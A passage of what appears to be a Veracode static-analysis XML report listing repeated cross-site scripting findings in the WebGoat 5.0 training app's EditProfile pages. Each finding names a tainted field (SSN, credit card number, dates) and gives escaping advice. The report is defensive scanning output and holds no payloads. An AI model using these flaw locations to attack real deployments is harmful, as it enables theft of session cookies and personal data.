        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"78\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"37\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"195\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getStartDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"78\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"37\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"125\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getSsn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"82\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"41\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"61\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getSsn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"82\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"41\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"65\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getSsn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"82\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"41\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"249\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getCcn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"90\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"47\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"140\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getCcn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"90\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"47\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"152\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getCcn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"90\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"47\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"134\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPersonalDescription().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"98\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"54\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"142\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPersonalDescription().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"98\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"54\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"73\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPersonalDescription().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"98\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"54\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"131\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"102\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"57\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"157\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
